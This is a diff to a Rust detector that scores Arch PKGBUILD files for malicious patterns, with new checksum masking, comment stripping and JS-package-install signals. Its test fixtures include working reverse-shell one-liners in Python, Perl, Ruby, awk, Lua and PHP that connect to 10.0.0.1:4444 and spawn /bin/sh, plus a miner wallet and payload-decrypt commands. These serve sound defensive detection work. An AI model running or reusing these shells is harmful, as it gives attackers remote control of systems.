@@ -3,6 +3,72 @@ pub mod patterns;
 use crate::features::Feature;
 use crate::shared::models::PackageContext;
 use crate::shared::scoring::{Signal, SignalCategory};
+use regex::Regex;
+use std::sync::LazyLock;
+
+static CHECKSUM_ARRAY_OPEN_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?im)^[ \t]*(md5|sha\d+|b2)sums(_[a-zA-Z0-9_]+)?[ \t]*\+?=[ \t]*\(").unwrap()
+});
+
+/// Remove checksum declarations from the view used for wallet-address matching.
+/// Line count is preserved so findings can still point at the original source.
+fn without_checksum_arrays(content: &str) -> String {
+    let mut masked = content.as_bytes().to_vec();
+    let mut search_start = 0usize;
+
+    while let Some(relative) = CHECKSUM_ARRAY_OPEN_RE.find(&content[search_start..]) {
+        let assignment_start = search_start + relative.start();
+        let opening = search_start + relative.end() - 1;
+        let Some(closing) = matching_array_paren(content, opening) else {
+            break;
+        };
+
+        for byte in &mut masked[assignment_start..=closing] {
+            if !matches!(*byte, b'\n' | b'\r') {
+                *byte = b' ';
+            }
+        }
+        search_start = closing + 1;
+    }
+
+    String::from_utf8(masked).expect("replacing checksum bytes with ASCII preserves UTF-8")
+}
+
+fn matching_array_paren(content: &str, opening: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    let mut quote = None;
+    let mut escaped = false;
+
+    for (offset, character) in content[opening..].char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if let Some(delimiter) = quote {
+            if character == delimiter {
+                quote = None;
+            } else if character == '\\' && delimiter == '"' {
+                escaped = true;
+            }
+            continue;
+        }
+
+        match character {
+            '\\' => escaped = true,
+            '\'' | '"' => quote = Some(character),
+            '(' => depth += 1,
+            ')' => {
+                depth = depth.checked_sub(1)?;
+                if depth == 0 {
+                    return Some(opening + offset);
+                }
+            }
+            _ => {}
+        }
+    }
+
+    None
+}
 
 pub struct PkgbuildAnalysis;
 
@@ -13,14 +79,27 @@ impl Feature for PkgbuildAnalysis {
         };
 
         let compiled = patterns::compiled_patterns();
+        let executable_content = crate::shared::shell_syntax::strip_comments(content);
+        let wallet_content = without_checksum_arrays(&executable_content);
         let mut signals = Vec::new();
 
         for pat in compiled {
-            if pat.regex.is_match(content) {
-                let matched_line = content
+            let analyzed_content = if pat.id == "P-CRYPTO-WALLET" {
+                &wallet_content
+            } else {
+                &executable_content
+            };
+
+            if pat.regex.is_match(analyzed_content) {
+                let matched_index = analyzed_content
                     .lines()
-                    .find(|line| pat.regex.is_match(line))
-                    .map(|line| line.trim().to_string());
+                    .position(|line| pat.regex.is_match(line));
+                let matched_line = matched_index.and_then(|index| {
+                    content
+                        .lines()
+                        .nth(index)
+                        .map(|line| line.trim().to_string())
+                });
                 signals.push(Signal {
                     id: pat.id.clone(),
                     category: SignalCategory::Pkgbuild,
@@ -30,6 +109,34 @@ impl Feature for PkgbuildAnalysis {
                     matched_line,
                 });
             }
+        }
+
+        let js_packages = crate::shared::js_package_manager::analyze(&executable_content);
+        if let Some(install) = js_packages.named_installs.first() {
+            signals.push(Signal {
+                id: "P-NAMED-JS-PACKAGE-INSTALL".to_string(),
+                category: SignalCategory::Pkgbuild,
+                points: 45,
+                description: format!(
+                    "Build step installs named package through {}: {}",
+                    install.manager, install.package
+                ),
+                is_override_gate: false,
+                matched_line: Some(install.matched_line.clone()),
+            });
+        }
+        if let Some(ioc) = js_packages.known_june_iocs.first() {
+            signals.push(Signal {
+                id: "P-JUNE-2026-JS-IOC".to_string(),
+                category: SignalCategory::Pkgbuild,
+                points: 90,
+                description: format!(
+                    "Named install references known June 2026 incident dependency: {}",
+                    ioc.package
+                ),
+                is_override_gate: false,
+                matched_line: Some(ioc.matched_line.clone()),
+            });
         }
 
         signals
@@ -53,7 +160,11 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        PkgbuildAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+        PkgbuildAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect()
     }
 
     fn has(ids: &[String], id: &str) -> bool {
@@ -133,19 +244,28 @@ mod tests {
     #[test]
     fn revshell_nc_megasync_no_signal() {
         let ids = analyze("git -C MEGAsync -c protocol.file.allow='always' submodule update");
-        assert!(!has(&ids, "P-REVSHELL-NC"), "MEGAsync should not trigger P-REVSHELL-NC, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-REVSHELL-NC"),
+            "MEGAsync should not trigger P-REVSHELL-NC, got: {ids:?}"
+        );
     }
 
     #[test]
     fn revshell_nc_sync_no_signal() {
         let ids = analyze("sync -c /dev/sda");
-        assert!(!has(&ids, "P-REVSHELL-NC"), "sync -c should not trigger P-REVSHELL-NC, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-REVSHELL-NC"),
+            "sync -c should not trigger P-REVSHELL-NC, got: {ids:?}"
+        );
     }
 
     #[test]
     fn revshell_nc_func_no_signal() {
         let ids = analyze("func -e test_handler");
-        assert!(!has(&ids, "P-REVSHELL-NC"), "func should not trigger P-REVSHELL-NC, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-REVSHELL-NC"),
+            "func should not trigger P-REVSHELL-NC, got: {ids:?}"
+        );
     }
 
     #[test]
@@ -156,7 +276,9 @@ mod tests {
 
     #[test]
     fn revshell_python() {
-        let ids = analyze("import socket; s=socket.socket(); s.connect(('10.0.0.1',4444)); import subprocess");
+        let ids = analyze(
+            "import socket; s=socket.socket(); s.connect(('10.0.0.1',4444)); import subprocess",
+        );
         assert!(has(&ids, "P-REVSHELL-PYTHON"));
     }
 
@@ -348,7 +470,9 @@ mod tests {
 
     #[test]
     fn crypto_wallet() {
-        let ids = analyze("--wallet 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A");
+        let ids = analyze(
+            "--wallet 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
+        );
         assert!(has(&ids, "P-CRYPTO-WALLET"));
     }
 
@@ -462,31 +586,40 @@ mod tests {
 
     #[test]
     fn revshell_perl() {
-        let ids = analyze("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'");
+        let ids = analyze(
+            "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'",
+        );
         assert!(has(&ids, "P-REVSHELL-PERL"));
     }
 
     #[test]
     fn revshell_ruby() {
-        let ids = analyze("ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
+        let ids = analyze(
+            "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        );
         assert!(has(&ids, "P-REVSHELL-RUBY"));
     }
 
     #[test]
     fn revshell_awk() {
-        let ids = analyze("awk 'BEGIN {s=\"/inet/tcp/0/10.0.0.1/4444\"; while(1) { s |& getline c; print c |& \"/bin/sh\"; }}'");
+        let ids = analyze(
+            "awk 'BEGIN {s=\"/inet/tcp/0/10.0.0.1/4444\"; while(1) { s |& getline c; print c |& \"/bin/sh\"; }}'",
+        );
         assert!(has(&ids, "P-REVSHELL-AWK"));
     }
 
     #[test]
     fn revshell_lua() {
-        let ids = analyze("lua -e \"require('socket');s=socket.tcp();s:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')\"");
+        let ids = analyze(
+            "lua -e \"require('socket');s=socket.tcp();s:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
+        );
         assert!(has(&ids, "P-REVSHELL-LUA"));
     }
 
     #[test]
     fn revshell_php() {
-        let ids = analyze("php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
+        let ids =
+            analyze("php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
         assert!(has(&ids, "P-REVSHELL-PHP"));
     }
 
@@ -532,7 +665,8 @@ mod tests {
 
     #[test]
     fn openssl_decrypt() {
-        let ids = analyze("openssl enc aes-256-cbc -d -in payload.enc -out payload.sh -pass pass:key");
+        let ids =
+            analyze("openssl enc aes-256-cbc -d -in payload.enc -out payload.sh -pass pass:key");
         assert!(has(&ids, "P-OPENSSL-DECRYPT"));
     }
 
@@ -638,7 +772,8 @@ mod tests {
 
     #[test]
     fn benign_pkgbuild_no_signals() {
-        let ids = analyze(r#"
+        let ids = analyze(
+            r#"
 pkgname=yay
 pkgver=12.4.2
 pkgrel=1
@@ -658,8 +793,12 @@ build() {
 package() {
     install -Dm755 yay "${pkgdir}/usr/bin/yay"
 }
-"#);
-        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
+"#,
+        );
+        assert!(
+            ids.is_empty(),
+            "Benign PKGBUILD should trigger no signals, got: {ids:?}"
+        );
     }
 
     // --- Flag spacing bypass (issue #4) ---
@@ -747,19 +886,28 @@ package() {
     #[test]
     fn chmod_755_no_suid() {
         let ids = analyze("chmod 755 /usr/bin/tool");
-        assert!(!has(&ids, "P-SUID-BIT"), "chmod 755 should not trigger SUID, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-SUID-BIT"),
+            "chmod 755 should not trigger SUID, got: {ids:?}"
+        );
     }
 
     #[test]
     fn chmod_644_no_suid() {
         let ids = analyze("chmod 644 /usr/share/file");
-        assert!(!has(&ids, "P-SUID-BIT"), "chmod 644 should not trigger SUID, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-SUID-BIT"),
+            "chmod 644 should not trigger SUID, got: {ids:?}"
+        );
     }
 
     #[test]
     fn find_chmod_755_no_suid() {
         let ids = analyze(r#"find "${pkgdir}" -type d -exec chmod 755 {} +"#);
-        assert!(!has(&ids, "P-SUID-BIT"), "find chmod 755 should not trigger SUID, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-SUID-BIT"),
+            "find chmod 755 should not trigger SUID, got: {ids:?}"
+        );
     }
 
     // --- Crypto wallet false positive regression ---
@@ -767,6 +915,55 @@ package() {
     #[test]
     fn crypto_wallet_sha256_no_signal() {
         let ids = analyze("'cf5438cf5dbbc10d9b17cad5655e2fb1f15d5196755ea0b3ecbee81b2c8682fe')");
-        assert!(!has(&ids, "P-CRYPTO-WALLET"), "SHA256 hash should not trigger crypto wallet, got: {ids:?}");
+        assert!(
+            !has(&ids, "P-CRYPTO-WALLET"),
+            "SHA256 hash should not trigger crypto wallet, got: {ids:?}"
+        );
+    }
+
+    #[test]
+    fn crypto_wallet_sha512_checksum_no_signal() {
+        let sha512 = format!("4A{}", "a".repeat(126));
+        let ids = analyze(&format!("sha512sums=(\n  '{sha512}'\n)"));
+        assert!(
+            !has(&ids, "P-CRYPTO-WALLET"),
+            "SHA512 checksum should not trigger crypto wallet, got: {ids:?}"
+        );
+    }
+
+    #[test]
+    fn quoted_paren_does_not_end_checksum_masking() {
+        let wallet_shaped_checksum = format!("4A{}", "a".repeat(93));
+        let ids = analyze(&format!(
+            "sha512sums=('literal)character'\n  '{wallet_shaped_checksum}')"
+        ));
+        assert!(!has(&ids, "P-CRYPTO-WALLET"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn wallet_after_checksum_array_on_same_line_still_signals() {
+        let wallet = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+        let ids = analyze(&format!("sha256sums=('abc'); wallet={wallet}"));
+        assert!(has(&ids, "P-CRYPTO-WALLET"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn real_monero_wallet_still_signals() {
+        let ids = analyze(
+            "wallet=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
+        );
+        assert!(has(&ids, "P-CRYPTO-WALLET"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn maintainer_comment_does_not_trigger_base64() {
+        let ids = analyze("# Upstream suggests using base64 -d when debugging\npkgname=test");
+        assert!(!has(&ids, "P-BASE64"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quoted_hash_character_is_not_a_comment() {
+        let ids = analyze("echo '# keep this literal'\necho payload | base64 -d");
+        assert!(has(&ids, "P-BASE64"), "got: {ids:?}");
     }
 }
